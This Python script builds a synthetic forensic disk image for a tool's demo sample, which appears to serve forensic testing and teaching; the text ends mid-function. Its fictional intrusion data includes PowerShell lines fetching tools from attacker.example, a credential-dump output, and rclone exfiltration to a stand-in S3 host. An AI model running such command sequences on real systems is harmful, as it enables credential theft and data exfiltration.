#!/usr/bin/env python3
"""Generate the synthetic "Try a sample" disk image served at /samples/.

    python3 scripts/make-samples.py [out_dir]      (default: public/samples)

Standard library only, fully deterministic (fixed GUIDs, serials and times),
so re-running it produces a byte-identical image.

The image is a small raw/dd disk of the fictional workstation FIN-WKS-07,
built from real on-disk structures (nothing is copied from a real system):

  LBA 0        protective MBR (type 0xEE)
  LBA 1..33    GPT header + 128-entry partition array (CRC32s valid)
  P1           Microsoft reserved partition (no filesystem, as on Windows)
  P2  "OS"     NTFS 3.1 volume, the C: drive: boot sector + backup, $MFT with
               the system metafiles ($MFTMirr, $LogFile, $Volume, $AttrDef,
               $Bitmap, $Boot, $BadClus, $Secure, $UpCase, $Extend), $I30
               directory indexes (resident $INDEX_ROOT or INDX blocks), and
               the user files of the intrusion
  gap          unpartitioned space between P2 and P3
  P3  "DATA"   FAT32 volume, the E: drive (small FAT32: it follows the BPB
               definition used by Linux and this tool; Windows would want
               >= 65525 clusters, which would not fit a tiny demo image)
  last 33 LBA  backup GPT array + header

Story (shared with the sister parsers): on 2026-09-14 ~10:00-10:55 UTC the
rogue account `svc_backup` downloads tools.zip, drops m64.exe into
C:\\ProgramData\\Intel (timestomped), dumps credentials to creds.txt and
deletes it, stages files in E:\\exfil\\ and pushes them out with
C:\\Users\\Public\\rclone.exe. The executables are text placeholders, not
programs; every name, hash and address is fictional (.example domains,
documentation IP ranges).

What the sample exercises in the tool: GPT partition tree with an MSR and an
unpartitioned gap, NTFS + FAT32 identification, $MFT file tree, an Alternate
Data Stream (Zone.Identifier), $SI/$FN timestomp flags (SI<FN + uSec zeros),
a deleted-but-recoverable NTFS file, file slack, [unallocated space], a
deleted FAT32 entry with long filename, carvable ZIPs, and triage presets
(NTFS metadata, PowerShell history).
"""

from __future__ import annotations

import io
import struct
import sys
import uuid
import zipfile
import zlib
from datetime import datetime, timezone
from pathlib import Path

SECTOR = 512

# ---------------------------------------------------------------- helpers ---


def align(n: int, a: int) -> int:
    return (n + a - 1) // a * a


def utc(y, mo, d, h=0, mi=0, s=0, us=0) -> datetime:
    return datetime(y, mo, d, h, mi, s, us, tzinfo=timezone.utc)


EPOCH_1601 = utc(1601, 1, 1)


def filetime(dt: datetime, ticks: int = 0) -> int:
    """FILETIME (100 ns since 1601). `ticks` adds sub-microsecond precision."""
    delta = dt - EPOCH_1601
    return (delta.days * 86400 + delta.seconds) * 10_000_000 + delta.microseconds * 10 + ticks


def u16(v):
    return struct.pack("<H", v)


def u32(v):
    return struct.pack("<I", v)


def u64(v):
    return struct.pack("<Q", v)


def guid(s: str) -> bytes:
    return uuid.UUID(s).bytes_le


def crlf(text: str) -> bytes:
    return text.replace("\n", "\r\n").encode("utf-8")


def make_zip(members: list[tuple[str, bytes, tuple]]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data, dt in members:
            info = zipfile.ZipInfo(name, date_time=dt)
            info.compress_type = zipfile.ZIP_DEFLATED
            info.create_system = 0  # MS-DOS
            info.external_attr = 0x20  # FILE_ATTRIBUTE_ARCHIVE
            z.writestr(info, data)
    return buf.getvalue()


def placeholder(name: str, size: int) -> bytes:
    """Readable filler standing in for a binary we must not ship."""
    head = (
        f"SYNTHETIC PLACEHOLDER for {name}\r\n"
        "Disk Image Parser demo sample (fictional FIN-WKS-07 intrusion).\r\n"
        "This is not an executable and contains no real tooling.\r\n"
    ).encode()
    line = f"-- {name} placeholder padding --\r\n".encode()
    out = bytearray(head)
    while len(out) < size:
        out += line
    return bytes(out[:size])


# ------------------------------------------------------------------ story ---

HOST = "FIN-WKS-07"
INSTALL = utc(2026, 3, 2, 8, 15, 4, 123456)
SID = "S-1-5-21-3623811015-3361044348-30300820-1013"

M64 = placeholder("m64.exe", 9_216)
RCLONE = placeholder("rclone.exe", 6_000)
RCLONE_CONF = crlf(
    "[exfil]\n"
    "type = s3\n"
    "provider = Minio\n"
    "endpoint = https://s3.exfil.example:9000\n"
    "access_key_id = SYNTHETICEXAMPLEKEY01\n"
    "secret_access_key = synthetic/example/not-a-real-secret\n"
    "region = us-east-1\n"
)
# Remnant left in rclone.exe's last cluster: an older draft of the config
# pointing at the raw IP (surfaces through "file slack").
SLACK_REMNANT = crlf(
    "[exfil]\ntype = s3\nendpoint = https://203.0.113.45:9000\n"
    "# fallback: sftp svc_backup@198.51.100.23\n"
)
CREDS = crlf(
    "m64 v2.2 -- output (synthetic demo data)\n"
    f"Host      : {HOST}\n"
    "Collected : 2026-09-14 10:09:02 UTC\n"
    "\n"
    "Domain  : FIN\n"
    "User    : svc_backup\n"
    "NTLM    : 31d6cfe0d16ae931b73c59d7e0c089c0\n"
    "\n"
    "Domain  : FIN\n"
    "User    : adm_jdoe\n"
    "NTLM    : 00000000000000000000000000000000\n"
)
PS_HISTORY = crlf(
    "whoami /all\n"
    "hostname\n"
    "Invoke-WebRequest -Uri https://files.attacker.example/tools.zip -OutFile C:\\Users\\svc_backup\\Downloads\\tools.zip\n"
    "New-Item -ItemType Directory C:\\ProgramData\\Intel\n"
    "Expand-Archive C:\\Users\\svc_backup\\Downloads\\tools.zip -DestinationPath C:\\ProgramData\\Intel\n"
    "C:\\ProgramData\\Intel\\m64.exe > C:\\ProgramData\\Intel\\creds.txt\n"
    "Move-Item C:\\ProgramData\\Intel\\rclone.exe C:\\Users\\Public\\rclone.exe\n"
    "robocopy \\\\FIN-FS-01\\Finance E:\\exfil /E\n"
    "C:\\Users\\Public\\rclone.exe copy E:\\exfil exfil:drop --config C:\\Users\\svc_backup\\AppData\\Roaming\\rclone\\rclone.conf\n"
    "Remove-Item C:\\ProgramData\\Intel\\creds.txt\n"
    "Clear-History\n"
)
ZONE_ID = crlf(
    "[ZoneTransfer]\n"
    "ZoneId=3\n"
    "ReferrerUrl=https://files.attacker.example/\n"
    "HostUrl=https://files.attacker.example/tools.zip\n"
)
TOOLS_ZIP = make_zip(
    [
        ("m64.exe", M64, (2026, 9, 1, 22, 40, 12)),
        ("rclone.exe", RCLONE, (2026, 9, 1, 22, 41, 0)),
    ]
)

PAYROLL = crlf(
    "employee_id,name,department,monthly_gross_eur\n"
    + "".join(f"E{1000 + i},Employee {i:03d},{d},{3200 + i * 137}\n"
              for i, d in enumerate(["Finance", "Treasury", "Audit", "Finance", "Payroll", "Finance"]))
)
VENDORS = crlf(
    "vendor,iban_placeholder,contact\n"
    "Contoso Supplies,XX00-EXAMPLE-0001,ap@contoso.example\n"
    "Fabrikam Logistics,XX00-EXAMPLE-0002,billing@fabrikam.example\n"
    "Northwind Traders,XX00-EXAMPLE-0003,finance@northwind.example\n"
)
FORECAST_ZIP = make_zip(
    [
        ("q3_forecast.csv", crlf("month,revenue_keur,cost_keur\n2026-07,4120,3310\n2026-08,3985,3290\n2026-09,4302,3355\n"), (2026, 9, 10, 17, 2, 44)),
        ("board_notes.txt", crlf("Q3 board pack -- DRAFT (synthetic demo data)\n"), (2026, 9, 11, 9, 30, 0)),
    ]
)
FILELIST = crlf(
    "E:\\exfil\\payroll_2026-08.csv\n"
    "E:\\exfil\\vendor_master.csv\n"
    "E:\\exfil\\Q3_forecast_board_pack.zip\n"
    "-> exfil:drop (https://s3.exfil.example:9000)\n"
)

# =================================================================== NTFS ===

NTFS_BPC = 4096  # bytes per cluster
NTFS_SPC = NTFS_BPC // SECTOR
REC = 1024  # MFT record size
MFT_RECORDS = 64
MFT_LCN = 4
MFTMIRR_LCN = 2
IDX_BLOCK = 4096

ATTR_SI, ATTR_FN, ATTR_VOLNAME, ATTR_VOLINFO = 0x10, 0x30, 0x60, 0x70
ATTR_DATA, ATTR_IROOT, ATTR_IALLOC, ATTR_BITMAP = 0x80, 0x90, 0xA0, 0xB0

FA_READONLY, FA_HIDDEN, FA_SYSTEM, FA_ARCHIVE = 0x1, 0x2, 0x4, 0x20
FN_DIR = 0x10000000


def runlist(runs: list[tuple[int | None, int]]) -> bytes:
    """Encode (lcn|None, length) runs as an NTFS mapping-pairs array."""

    def sbytes(v: int) -> bytes:
        n = 1
        while not (-(1 << (8 * n - 1)) <= v < (1 << (8 * n - 1))):
            n += 1
        return v.to_bytes(n, "little", signed=True)

    def ubytes(v: int) -> bytes:
        return v.to_bytes(max(1, (v.bit_length() + 7) // 8), "little")

    out = bytearray()
    prev = 0
    for lcn, length in runs:
        lb = ubytes(length)
        if lcn is None:
            out += bytes([len(lb)]) + lb
        else:
            ob = sbytes(lcn - prev)
            prev = lcn
            out += bytes([(len(ob) << 4) | len(lb)]) + lb + ob
    return bytes(out + b"\x00")


class Attr:
    def __init__(self, type_id: int, name: str = "", resident: bytes | None = None,
                 runs=None, real_size: int = 0, alloc_size: int | None = None, flags: int = 0):
        self.type_id, self.name, self.resident = type_id, name, resident
        self.runs, self.real_size, self.flags = runs, real_size, flags
        self.alloc_size = alloc_size

    def encode(self, attr_id: int) -> bytes:
        name = self.name.encode("utf-16-le")
        if self.resident is not None:
            name_off = 0x18
            content_off = align(name_off + len(name), 8)
            total = align(content_off + len(self.resident), 8)
            b = bytearray(total)
            b[0:4] = u32(self.type_id)
            b[4:8] = u32(total)
            b[8] = 0
            b[9] = len(self.name)
            b[10:12] = u16(name_off)
            b[12:14] = u16(self.flags)
            b[14:16] = u16(attr_id)
            b[16:20] = u32(len(self.resident))
            b[20:22] = u16(content_off)
            # Indexed flag on $FILE_NAME (it is referenced by a $I30 index).
            b[22] = 1 if self.type_id == ATTR_FN else 0
            b[name_off:name_off + len(name)] = name
            b[content_off:content_off + len(self.resident)] = self.resident
            return bytes(b)
        rl = runlist(self.runs)
        clusters = sum(n for _, n in self.runs)
        alloc = self.alloc_size if self.alloc_size is not None else clusters * NTFS_BPC
        name_off = 0x40
        runs_off = align(name_off + len(name), 8)
        total = align(runs_off + len(rl), 8)
        b = bytearray(total)
        b[0:4] = u32(self.type_id)
        b[4:8] = u32(total)
        b[8] = 1
        b[9] = len(self.name)
        b[10:12] = u16(name_off)
        b[12:14] = u16(self.flags)
        b[14:16] = u16(attr_id)
        b[16:24] = u64(0)  # starting VCN
        b[24:32] = u64(clusters - 1)  # last VCN
        b[32:34] = u16(runs_off)
        b[40:48] = u64(alloc)
        b[48:56] = u64(self.real_size)
        b[56:64] = u64(self.real_size)  # initialized size
        b[name_off:name_off + len(name)] = name
        b[runs_off:runs_off + len(rl)] = rl
        return bytes(b)


def apply_fixup(buf: bytearray, usa_off: int, usn: int = 1) -> None:
    count = len(buf) // SECTOR
    buf[usa_off:usa_off + 2] = u16(usn)
    for i in range(1, count + 1):
        end = i * SECTOR
        buf[usa_off + 2 * i:usa_off + 2 * i + 2] = buf[end - 2:end]
        buf[end - 2:end] = u16(usn)


def mft_record(num: int, attrs: list[Attr], in_use=True, is_dir=False, seq=1, links=1) -> bytes:
    r = bytearray(REC)
    r[0:4] = b"FILE"
    r[4:6] = u16(0x30)  # update sequence array offset
    r[6:8] = u16(REC // SECTOR + 1)
    r[8:16] = u64(0)  # $LogFile LSN
    r[16:18] = u16(seq)
    r[18:20] = u16(links if attrs else 0)
    r[20:22] = u16(0x38)
    r[22:24] = u16((0x01 if in_use else 0) | (0x02 if is_dir else 0))
    off = 0x38
    for i, a in enumerate(sorted(attrs, key=lambda a: (a.type_id, a.name))):
        enc = a.encode(i)
        r[off:off + len(enc)] = enc
        off += len(enc)
    r[off:off + 4] = u32(0xFFFFFFFF)
    r[24:28] = u32(off + 8)  # bytes in use
    r[28:32] = u32(REC)
    r[40:42] = u16(len(attrs))  # next attribute id
    r[44:48] = u32(num)
    apply_fixup(r, 0x30)
    return bytes(r)


def std_info(times: tuple[int, int, int, int], attrs: int) -> bytes:
    c, m, ch, a = times
    return u64(c) + u64(m) + u64(ch) + u64(a) + u32(attrs) + bytes(12) + u32(0) + u32(0x100) + u64(0) + u64(0)


def file_name(parent: int, parent_seq: int, name: str, times, alloc: int, real: int,
              flags: int, namespace: int = 1) -> bytes:
    c, m, ch, a = times
    n = name.encode("utf-16-le")
    return (u64(parent | (parent_seq << 48)) + u64(c) + u64(m) + u64(ch) + u64(a)
            + u64(alloc) + u64(real) + u32(flags) + u32(0)
            + bytes([len(name), namespace]) + n)


def index_entry(ref: int, seq: int, key: bytes) -> bytes:
    length = align(16 + len(key), 8)
    b = bytearray(length)
    b[0:8] = u64(ref | (seq << 48))
    b[8:10] = u16(length)
    b[10:12] = u16(len(key))
    b[12:16] = u32(0)
    b[16:16 + len(key)] = key
    return bytes(b)


def end_entry(subnode_vcn: int | None = None) -> bytes:
    if subnode_vcn is None:
        return u64(0) + u16(16) + u16(0) + u32(0x02)
    return u64(0) + u16(24) + u16(0) + u32(0x03) + u64(subnode_vcn)


def upcase_key(name: str) -> tuple:
    return tuple(ord(ch.upper()) if len(ch.upper()) == 1 else ord(ch) for ch in name)


def ntfs_serial() -> int:
    return 0x4E2A_17C0_B3D5_9E61


class NtfsVolume:
    """Assembles a small NTFS 3.1 volume in memory."""

    def __init__(self, sectors: int, hidden_sectors: int, label: str):
        self.sectors = sectors
        self.clusters = (sectors - 1) // NTFS_SPC  # last sector = backup boot
        self.img = bytearray(sectors * SECTOR)
        self.hidden = hidden_sectors
        self.label = label
        self.used = set()
        self.next_free = 0
        self.files: dict[int, dict] = {}
        # Fixed system extents: $Boot (8 KiB), $MFTMirr, $MFT.
        self.reserve(0, 2)
        self.reserve(MFTMIRR_LCN, 1)
        self.reserve(MFT_LCN, MFT_RECORDS * REC // NTFS_BPC)

    # -- clusters --------------------------------------------------------
    def reserve(self, lcn: int, n: int) -> None:
        self.used.update(range(lcn, lcn + n))

    def alloc(self, n: int) -> int:
        lcn = self.next_free
        while any(c in self.used for c in range(lcn, lcn + n)):
            lcn += 1
        self.reserve(lcn, n)
        self.next_free = lcn + n
        return lcn

    def write_clusters(self, lcn: int, data: bytes) -> None:
        o = lcn * NTFS_BPC
        self.img[o:o + len(data)] = data

    def store(self, data: bytes, slack: bytes = b"") -> tuple[list, int]:
        n = max(1, align(len(data), NTFS_BPC) // NTFS_BPC)
        lcn = self.alloc(n)
        self.write_clusters(lcn, data)
        if slack:
            self.write_clusters(lcn, data + slack)
        return [(lcn, n)], len(data)

    # -- files -----------------------------------------------------------
    def add(self, num: int, name: str, parent: int, *, is_dir=False, data: bytes | None = None,
            times=None, fn_times=None, attrs=FA_ARCHIVE, extra: list[Attr] | None = None,
            in_use=True, namespace=1, fn_flags=None, nonresident=None, slack=b"",
            data_attr: Attr | None = None, seq=1) -> None:
        times = times or (filetime(INSTALL),) * 4
        fn_times = fn_times or times
        self.files[num] = dict(
            name=name, parent=parent, is_dir=is_dir, data=data, times=times, fn_times=fn_times,
            attrs=attrs, extra=extra or [], in_use=in_use, namespace=namespace,
            fn_flags=fn_flags, nonresident=nonresident, slack=slack, data_attr=data_attr, seq=seq,
        )

    def build(self) -> bytes:
        # Materialise data streams (non-resident where large).
        for num in sorted(self.files):
            f = self.files[num]
            f["data_attrs"] = []
            if f["is_dir"]:
                continue
            if f["data_attr"] is not None:
                f["data_attrs"].append(f["data_attr"])
                f["size"] = f["data_attr"].real_size
                continue
            data = f["data"] or b""
            nonres = f["nonresident"] if f["nonresident"] is not None else len(data) > 600
            if nonres:
                runs, size = self.store(data, f["slack"])
                if not f["in_use"]:
                    # Deleted: clusters go back to $Bitmap, bytes stay on disk.
                    for lcn, n in runs:
                        self.used.difference_update(range(lcn, lcn + n))
                f["data_attrs"].append(Attr(ATTR_DATA, runs=runs, real_size=size))
                f["size"], f["alloc"] = size, sum(n for _, n in runs) * NTFS_BPC
            else:
                f["data_attrs"].append(Attr(ATTR_DATA, resident=data))
                f["size"], f["alloc"] = len(data), align(len(data), 8)

        # Directory indexes (need the children's $FILE_NAME keys).
        for num in sorted(self.files):
            f = self.files[num]
            if f["is_dir"]:
                f["index_attrs"] = self.dir_index(num)

        # $Bitmap content (after every allocation above).
        bitmap_bytes = align((self.clusters + 7) // 8, 8)
        bm_lcn = self.files[6]["data_attr"].runs[0][0]
        bm = bytearray(bitmap_bytes)
        for c in self.used:
            if c < self.clusters:
                bm[c // 8] |= 1 << (c % 8)
        self.write_clusters(bm_lcn, bytes(bm))

        # MFT records.
        mft = bytearray()
        mft_bitmap = bytearray(8)
        for num in range(MFT_RECORDS):
            if num in self.files:
                rec = self.record(num)
                if self.files[num]["in_use"]:
                    mft_bitmap[num // 8] |= 1 << (num % 8)
            elif num < 16:
                rec = mft_record(num, [], in_use=True)  # reserved 12-15
                mft_bitmap[num // 8] |= 1 << (num % 8)
            else:
                rec = mft_record(num, [], in_use=False, seq=0)
            mft += rec
        self.mft_bitmap = bytes(mft_bitmap)
        # Record 0 carries the $MFT's own $BITMAP: rebuild it with the final bitmap.
        mft[0:REC] = self.record(0)
        self.write_clusters(MFT_LCN, bytes(mft))
        self.write_clusters(MFTMIRR_LCN, bytes(mft[: 4 * REC]))

        # Boot sector + backup in the last sector.
        boot = self.boot_sector()
        self.img[0:SECTOR] = boot
        self.img[-SECTOR:] = boot
        # $Boot is 8 KiB; the rest of it (boot code) stays zero.
        return bytes(self.img)

    def fn_key(self, num: int) -> bytes:
        f = self.files[num]
        pseq = self.files[f["parent"]]["seq"]
        flags = f["fn_flags"] if f["fn_flags"] is not None else (
            f["attrs"] | (FN_DIR if f["is_dir"] else 0))
        return file_name(f["parent"], pseq, f["name"], f["fn_times"],
                         f.get("alloc", 0), f.get("size", 0), flags, f["namespace"])

    def dir_index(self, num: int) -> list[Attr]:
        kids = [k for k, f in self.files.items()
                if f["parent"] == num and k != num and f["in_use"]]
        kids.sort(key=lambda k: upcase_key(self.files[k]["name"]))
        entries = b"".join(index_entry(k, self.files[k]["seq"], self.fn_key(k)) for k in kids)

        def root(entries_blob: bytes, large: bool) -> bytes:
            hdr = u32(16) + u32(16 + len(entries_blob)) + u32(16 + len(entries_blob)) + u32(1 if large else 0)
            return u32(ATTR_FN) + u32(1) + u32(IDX_BLOCK) + u32(1) + hdr + entries_blob

        small = entries + end_entry()
        if len(small) <= 480:
            return [Attr(ATTR_IROOT, "$I30", resident=root(small, False))]

        # Large index: one INDX leaf block referenced from the root's end entry.
        blk = bytearray(IDX_BLOCK)
        blk[0:4] = b"INDX"
        blk[4:6] = u16(0x28)
        blk[6:8] = u16(IDX_BLOCK // SECTOR + 1)
        blk[16:24] = u64(0)  # VCN
        body = entries + end_entry()
        ent_off = 0x40 - 0x18
        blk[0x18:0x1C] = u32(ent_off)
        blk[0x1C:0x20] = u32(ent_off + len(body))
        blk[0x20:0x24] = u32(IDX_BLOCK - 0x18)
        blk[0x24:0x28] = u32(0)  # leaf
        blk[0x40:0x40 + len(body)] = body
        apply_fixup(blk, 0x28)
        lcn = self.alloc(1)
        self.write_clusters(lcn, bytes(blk))
        return [
            Attr(ATTR_IROOT, "$I30", resident=root(end_entry(0), True)),
            Attr(ATTR_IALLOC, "$I30", runs=[(lcn, 1)], real_size=IDX_BLOCK),
            Attr(ATTR_BITMAP, "$I30", resident=b"\x01" + bytes(7)),
        ]

    def record(self, num: int) -> bytes:
        f = self.files[num]
        attrs = [Attr(ATTR_SI, resident=std_info(f["times"], f["attrs"]))]
        attrs.append(Attr(ATTR_FN, resident=self.fn_key(num)))
        attrs += f["extra"]
        attrs += f.get("data_attrs", [])
        attrs += f.get("index_attrs", [])
        if num == 0:
            attrs.append(Attr(ATTR_BITMAP, resident=getattr(self, "mft_bitmap", bytes(8))))
        return mft_record(num, attrs, in_use=f["in_use"], is_dir=f["is_dir"], seq=f["seq"])

    def boot_sector(self) -> bytes:
        b = bytearray(SECTOR)
        b[0:3] = b"\xEB\x52\x90"
        b[3:11] = b"NTFS    "
        b[11:13] = u16(SECTOR)
        b[13] = NTFS_SPC
        b[21] = 0xF8  # media descriptor
        b[24:26] = u16(63)
        b[26:28] = u16(255)
        b[28:32] = u32(self.hidden)
        b[36:40] = u32(0x00800080)
        b[40:48] = u64(self.sectors - 1)
        b[48:56] = u64(MFT_LCN)
        b[56:64] = u64(MFTMIRR_LCN)
        b[64] = 0xF6  # 2^10 = 1024-byte MFT records
        b[68] = 1  # one cluster per index block
        b[72:80] = u64(ntfs_serial())
        b[510:512] = b"\x55\xAA"
        return bytes(b)


def attrdef_table() -> bytes:
    rows = [
        ("$STANDARD_INFORMATION", 0x10, 0x40, 0x30, 0x48),
        ("$ATTRIBUTE_LIST", 0x20, 0x80, 0, -1),
        ("$FILE_NAME", 0x30, 0x42, 0x44, 0x242),
        ("$OBJECT_ID", 0x40, 0x40, 0, 0x100),
        ("$SECURITY_DESCRIPTOR", 0x50, 0x80, 0, -1),
        ("$VOLUME_NAME", 0x60, 0x40, 2, 0x100),
        ("$VOLUME_INFORMATION", 0x70, 0x40, 0xC, 0xC),
        ("$DATA", 0x80, 0x00, 0, -1),
        ("$INDEX_ROOT", 0x90, 0x40, 0, -1),
        ("$INDEX_ALLOCATION", 0xA0, 0x80, 0, -1),
        ("$BITMAP", 0xB0, 0x80, 0, -1),
        ("$REPARSE_POINT", 0xC0, 0x80, 0, 0x4000),
        ("$EA_INFORMATION", 0xD0, 0x40, 8, 8),
        ("$EA", 0xE0, 0x00, 0, 0x10000),
        ("$LOGGED_UTILITY_STREAM", 0x100, 0x80, 0, 0x10000),
    ]
    out = bytearray()
    for name, t, flags, mn, mx in rows:
        e = bytearray(160)
        n = name.encode("utf-16-le")
        e[0:len(n)] = n
        e[128:132] = u32(t)
        e[136:140] = u32(1 if t == ATTR_FN else 0)  # collation rule
        e[140:144] = u32(flags)
        e[144:152] = u64(mn)
        e[152:160] = struct.pack("<q", mx)
        out += e
    return bytes(out) + bytes(2560 - len(out))


def upcase_table() -> bytes:
    out = bytearray()
    for c in range(0x10000):
        if 0xD800 <= c <= 0xDFFF:
            up = c
        else:
            u = chr(c).upper()
            up = ord(u) if len(u) == 1 and ord(u) < 0x10000 else c
        out += u16(up)
    return bytes(out)


def build_ntfs(sectors: int, hidden: int) -> bytes:
    v = NtfsVolume(sectors, hidden, "OS")
    sys_t = (filetime(INSTALL),) * 4
    SYS = FA_HIDDEN | FA_SYSTEM

    def ft(dt, ticks=0):
        return filetime(dt, ticks)

    # $LogFile / $AttrDef / $UpCase / $Bitmap storage.
    logfile_runs = [(v.alloc(4), 4)]
    attrdef = attrdef_table()
    ad_runs, _ = v.store(attrdef)
    up = upcase_table()
    up_runs, _ = v.store(up)
    bm_lcn = v.alloc(1)

    mft_size = MFT_RECORDS * REC
    v.add(0, "$MFT", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=[(MFT_LCN, mft_size // NTFS_BPC)], real_size=mft_size))
    v.add(1, "$MFTMirr", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=[(MFTMIRR_LCN, 1)], real_size=4 * REC))
    v.add(2, "$LogFile", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=logfile_runs, real_size=4 * NTFS_BPC))
    volinfo = bytes(8) + bytes([3, 1]) + u16(0)
    v.add(3, "$Volume", 5, times=sys_t, attrs=SYS, namespace=3, data=b"", extra=[
        Attr(ATTR_VOLNAME, resident=v.label.encode("utf-16-le")),
        Attr(ATTR_VOLINFO, resident=volinfo),
    ])
    v.add(4, "$AttrDef", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=ad_runs, real_size=len(attrdef)))
    v.add(5, ".", 5, is_dir=True, times=sys_t, attrs=SYS, namespace=3)
    v.add(6, "$Bitmap", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=[(bm_lcn, 1)], real_size=align((v.clusters + 7) // 8, 8)))
    v.add(7, "$Boot", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=[(0, 2)], real_size=8192))
    v.add(8, "$BadClus", 5, times=sys_t, attrs=SYS, namespace=3, data=b"", extra=[
        Attr(ATTR_DATA, "$Bad", runs=[(None, v.clusters)], real_size=v.clusters * NTFS_BPC),
    ])
    v.add(9, "$Secure", 5, times=sys_t, attrs=SYS, namespace=3, data=b"")
    v.add(10, "$UpCase", 5, times=sys_t, attrs=SYS, namespace=3,
          data_attr=Attr(ATTR_DATA, runs=up_runs, real_size=len(up)))
    v.add(11, "$Extend", 5, is_dir=True, times=sys_t, attrs=SYS, namespace=3)

    # --- user data -------------------------------------------------------
    def dir_times(dt, ticks):
        t = ft(dt, ticks)
        return (t, t, t, t)

    v.add(16, "ProgramData", 5, is_dir=True, times=dir_times(INSTALL, 0), attrs=FA_HIDDEN)
    intel_t = ft(utc(2026, 9, 14, 10, 6, 58, 402113), 7)
    v.add(17, "Intel", 16, is_dir=True, times=(intel_t, ft(utc(2026, 9, 14, 10, 52, 40, 918222), 3),
                                               ft(utc(2026, 9, 14, 10, 52, 40, 918222), 3), intel_t), attrs=0)

    # m64.exe: timestomped. $SI rolled back to 2019 with zeroed sub-seconds,
    # $FN keeps the real extraction time.
    stomp = ft(utc(2019, 3, 18, 4, 12, 0))
    m64_fn = ft(utc(2026, 9, 14, 10, 7, 31, 526104), 9)
    v.add(18, "m64.exe", 17, data=M64, times=(stomp, stomp, stomp, stomp),
          fn_times=(m64_fn, m64_fn, m64_fn, m64_fn))

    # creds.txt: created by m64, then deleted -> record not in use, clusters
    # free in $Bitmap, content still on disk.
    c_cr = ft(utc(2026, 9, 14, 10, 9, 2, 114870), 1)
    c_del = ft(utc(2026, 9, 14, 10, 52, 40, 918222), 3)
    v.add(19, "creds.txt", 17, data=CREDS, nonresident=True, in_use=False, seq=2,
          times=(c_cr, c_cr, c_del, c_cr), fn_times=(c_cr, c_cr, c_cr, c_cr))

    v.add(20, "Users", 5, is_dir=True, times=dir_times(INSTALL, 0), attrs=FA_READONLY)
    prof = ft(utc(2026, 9, 14, 10, 2, 11, 730551), 2)
    v.add(21, "svc_backup", 20, is_dir=True, times=(prof,) * 4, attrs=0)
    v.add(22, "Downloads", 21, is_dir=True, times=(prof,) * 4, attrs=FA_READONLY)
    dl = ft(utc(2026, 9, 14, 10, 4, 37, 281944), 6)
    dl_done = ft(utc(2026, 9, 14, 10, 4, 39, 12007), 1)
    v.add(23, "tools.zip", 22, data=TOOLS_ZIP, times=(dl, dl_done, dl_done, dl_done),
          fn_times=(dl, dl, dl, dl),
          extra=[Attr(ATTR_DATA, "Zone.Identifier", resident=ZONE_ID)])

    v.add(24, "Public", 20, is_dir=True, times=dir_times(INSTALL, 0), attrs=FA_READONLY)
    rc = ft(utc(2026, 9, 14, 10, 12, 15, 660310), 4)
    v.add(25, "rclone.exe", 24, data=RCLONE, slack=b"\x00" * 16 + SLACK_REMNANT,
          times=(rc, rc, rc, rc))

    ad = ft(utc(2026, 9, 14, 10, 2, 11, 902318), 5)
    v.add(26, "AppData", 21, is_dir=True, times=(ad,) * 4, attrs=FA_HIDDEN)
    v.add(27, "Roaming", 26, is_dir=True, times=(ad,) * 4, attrs=0)
    v.add(28, "Microsoft", 27, is_dir=True, times=(ad,) * 4, attrs=0)
    v.add(29, "Windows", 28, is_dir=True, times=(ad,) * 4, attrs=0)
    v.add(30, "PowerShell", 29, is_dir=True, times=(ad,) * 4, attrs=0)
    ps = ft(utc(2026, 9, 14, 10, 3, 5, 447120), 8)
    v.add(31, "PSReadLine", 30, is_dir=True, times=(ps,) * 4, attrs=0)
    ps_last = ft(utc(2026, 9, 14, 10, 52, 41, 305561), 2)
    v.add(32, "ConsoleHost_history.txt", 31, data=PS_HISTORY, times=(ps, ps_last, ps_last, ps_last),
          fn_times=(ps, ps, ps, ps))
    rcd = ft(utc(2026, 9, 14, 10, 13, 40, 88213), 1)
    v.add(33, "rclone", 27, is_dir=True, times=(rcd,) * 4, attrs=0)
    v.add(34, "rclone.conf", 33, data=RCLONE_CONF, times=(rcd,) * 4)

    return v.build()


# ================================================================== FAT32 ===

FAT_SPC = 1
FAT_RESERVED = 32
FAT_NFATS = 2


def dos_dt(dt: datetime) -> tuple[int, int, int]:
    d = ((dt.year - 1980) << 9) | (dt.month << 5) | dt.day
    t = (dt.hour << 11) | (dt.minute << 5) | (dt.second // 2)
    tenth = (dt.second % 2) * 100 + dt.microsecond // 10000
    return d, t, tenth


def lfn_checksum(short: bytes) -> int:
    s = 0
    for c in short:
        s = (((s & 1) << 7) + (s >> 1) + c) & 0xFF
    return s


def short_name(name: str, taken: set[str]) -> tuple[bytes, bool]:
    """8.3 name (bytes[11]) and whether an LFN is needed."""
    base, _, ext = name.rpartition(".") if "." in name else (name, "", "")
    clean = lambda s: "".join(c for c in s.upper() if c.isalnum() or c in "$%'-_@~`!(){}^#&")
    b, e = clean(base), clean(ext)[:3]
    exact = name == name.upper() and len(base) <= 8 and len(ext) <= 3 and b == base.upper() and e == ext.upper()
    if exact:
        sn = b.ljust(8) + e.ljust(3)
    else:
        for i in range(1, 10):
            sn = (b[: 8 - 2] + f"~{i}").ljust(8) + e.ljust(3)
            if sn not in taken:
                break
    taken.add(sn)
    return sn.encode("ascii"), not exact


def dir_entries(name: str, attr: int, cluster: int, size: int, dt: datetime,
                taken: set[str], deleted=False) -> bytes:
    sn, need_lfn = short_name(name, taken)
    d, t, tenth = dos_dt(dt)
    e = bytearray(32)
    e[0:11] = sn
    e[11] = attr
    e[13] = tenth
    e[14:16] = u16(t)
    e[16:18] = u16(d)
    e[18:20] = u16(d)  # last access date
    e[20:22] = u16(cluster >> 16)
    e[22:24] = u16(t)
    e[24:26] = u16(d)
    e[26:28] = u16(cluster & 0xFFFF)
    e[28:32] = u32(size)
    out = bytearray()
    if need_lfn:
        chk = lfn_checksum(sn)
        units = list(name.encode("utf-16-le"))
